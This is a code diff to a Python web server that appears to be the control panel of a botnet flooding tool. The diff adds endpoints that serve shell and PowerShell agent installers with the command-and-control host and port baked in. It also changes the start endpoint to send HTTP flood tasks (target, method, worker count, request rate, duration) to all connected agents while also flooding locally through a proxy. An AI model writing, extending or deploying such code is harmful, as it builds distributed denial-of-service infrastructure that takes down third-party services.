@@ -65,7 +65,9 @@ _tasks      = {}   # agent_id -> task dict | None
 _results_lock = threading.Lock()
 _results      = []   # list of result dicts (last 200)
 
-AGENT_TEMPLATE = os.path.join(HERE, "agent", "agent_template.py")
+AGENT_TEMPLATE    = os.path.join(HERE, "agent", "agent_template.py")
+INSTALL_SH        = os.path.join(HERE, "agent", "install_template.sh")
+INSTALL_PS1       = os.path.join(HERE, "agent", "install_template.ps1")
 
 # ── Shared SSE / flood state ──────────────────────────────────────────────────
 _lock         = threading.Lock()
@@ -315,6 +317,52 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"results": list(_results)})
             return
 
+        # ── Installer scripts ─────────────────────────────────────────────────
+        if path in ("/install.sh", "/install.ps1"):
+            qs     = parsed.query
+            params = {}
+            for part in qs.split("&"):
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    params[k] = v
+            c2_host = params.get("host", "").strip()
+            c2_port = params.get("port", str(PORT)).strip()
+            if not c2_host:
+                # Serve raw template (browser preview)
+                tpl_file = INSTALL_SH if path.endswith(".sh") else INSTALL_PS1
+                try:
+                    with open(tpl_file, "rb") as f:
+                        raw = f.read()
+                    self.send_response(200)
+                    self._cors()
+                    self.send_header("Content-Type",   "text/plain; charset=utf-8")
+                    self.send_header("Content-Length", str(len(raw)))
+                    self.end_headers()
+                    self._safe_write(raw)
+                except Exception as e:
+                    self._json({"ok": False, "error": str(e)})
+                return
+            # Serve baked script
+            tpl_file = INSTALL_SH if path.endswith(".sh") else INSTALL_PS1
+            try:
+                with open(tpl_file, "r") as f:
+                    src = f.read()
+            except Exception as e:
+                self._json({"ok": False, "error": str(e)})
+                return
+            src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
+            data_out = src.encode()
+            fname    = "install.sh" if path.endswith(".sh") else "install.ps1"
+            mime     = "text/x-sh" if path.endswith(".sh") else "text/plain"
+            self.send_response(200)
+            self._cors()
+            self.send_header("Content-Type",        mime + "; charset=utf-8")
+            self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(fname))
+            self.send_header("Content-Length",      str(len(data_out)))
+            self.end_headers()
+            self._safe_write(data_out)
+            return
+
         # Static files
         if path == "/":
             path = "/index.html"
@@ -354,11 +402,13 @@ class Handler(BaseHTTPRequestHandler):
             self._json({"ok": True, "host": host, "port": port})
 
         elif path == "/api/start":
-            target   = (data.get("target") or "").strip()
-            method   = (data.get("method") or "GET").upper()
-            workers  = max(1,   int(data.get("workers", 50)))
-            rps      = max(0.1, float(data.get("rps", 100)))
-            duration = max(1.0, float(data.get("duration", 30)))
+            target      = (data.get("target") or "").strip()
+            method      = (data.get("method") or "GET").upper()
+            workers     = max(1,   int(data.get("workers", 50)))
+            rps         = max(0.1, float(data.get("rps", 100)))
+            duration    = max(1.0, float(data.get("duration", 30)))
+            local_flood = bool(data.get("local", True))   # run flood on this server
+            bot_dispatch = bool(data.get("bots", True))   # dispatch to agents
 
             if not target:
                 self._json({"ok": False, "error": "target is required"})
@@ -369,17 +419,42 @@ class Handler(BaseHTTPRequestHandler):
             if method not in valid:
                 self._json({"ok": False, "error": "invalid method"})
                 return
-            if _flood_thread and _flood_thread.is_alive():
-                self._json({"ok": False, "error": "flood already running"})
-                return
 
-            _flood_thread = threading.Thread(
-                target=_run_flood,
-                args=(target, method, workers, rps, duration),
-                daemon=True,
-            )
-            _flood_thread.start()
-            self._json({"ok": True})
+            # Dispatch task to all connected agents
+            dispatched = 0
+            if bot_dispatch:
+                task_id = "{:.0f}".format(time.time())
+                task_payload = {
+                    "task_id":  task_id,
+                    "target":   target,
+                    "method":   method,
+                    "workers":  workers,
+                    "rps":      rps,
+                    "duration": duration,
+                }
+                with _bots_lock:
+                    agent_ids = list(_bots.keys())
+                with _tasks_lock:
+                    for aid in agent_ids:
+                        _tasks[aid] = dict(task_payload)
+                        dispatched += 1
+                if dispatched:
+                    _broadcast({"type": "log", "level": "info",
+                                "msg": "Task dispatched to {} agent(s)".format(dispatched)})
+
+            # Run flood locally through proxy
+            if local_flood:
+                if _flood_thread and _flood_thread.is_alive():
+                    self._json({"ok": False, "error": "flood already running on this server"})
+                    return
+                _flood_thread = threading.Thread(
+                    target=_run_flood,
+                    args=(target, method, workers, rps, duration),
+                    daemon=True,
+                )
+                _flood_thread.start()
+
+            self._json({"ok": True, "dispatched": dispatched, "local": local_flood})
 
         elif path == "/api/stop":
             eng._STOP.set()
